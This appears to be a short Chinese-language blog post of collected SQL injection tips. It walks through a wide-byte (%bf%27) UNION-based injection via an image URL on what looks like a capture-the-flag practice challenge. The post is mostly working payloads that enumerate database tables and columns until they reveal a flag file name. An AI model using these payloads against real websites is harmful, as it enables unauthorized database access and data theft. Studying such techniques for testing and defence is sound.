---
title: injection skills
author: tank96a
layout: post
categories:
  - article
tags:
  - sqli
  - burp
---

 网上收集的注入技巧。
 
{% raw %}
<pre>
图片链接的宽字节注入
hex(r0466cplushua)=0x723034363663706c7573687561
hex(pic)=0x706963
cat1.jpg%bf%27 union select 1,2,TABLE_NAME,4 from information_schema.TABLES where table_SCHEMA=0x723034363663706c7573687561 limit 1,1#
cat1.jpg%bf%27 union select 1,2,COLUMN_NAME,4 from information_schema.COLUMNS where table_NAME=0x706963 limit 1,1#
cat1.jpg%bf%27 union select 1,2,picname,4 from pic limit 2,1#

http://xxx/images/cat1.jpg%bf%27%20union%20select%201,2,TABLE_NAME,4%20from%20information_schema.TABLES%20where%20table_SCHEMA=0x723034363663706c7573687561%20limit%201,1%23
得到表名：pic
http://xxx/images/cat1.jpg%bf%27%20union%20select%201,2,COLUMN_NAME,4%20from%20information_schema.COLUMNS%20where%20table_NAME=0x706963%20limit%201,1%23
得到字段名：picname
http://xxx/images/cat1.jpg%bf%27%20union%20select%201,2,picname,4%20from%20pic%20limit%202,1%23
得到图片名称：flagishere_askldjfklasjdfl.jpg
</pre>
{% endraw %}
 

相关链接：

[图片链接的宽字节注入writeup](http://www.tuicool.com/articles/e6ZRfei)
[网络信息安全攻防学习平台](http://www.waitalone.cn/security-sqlinject-jpg.html)

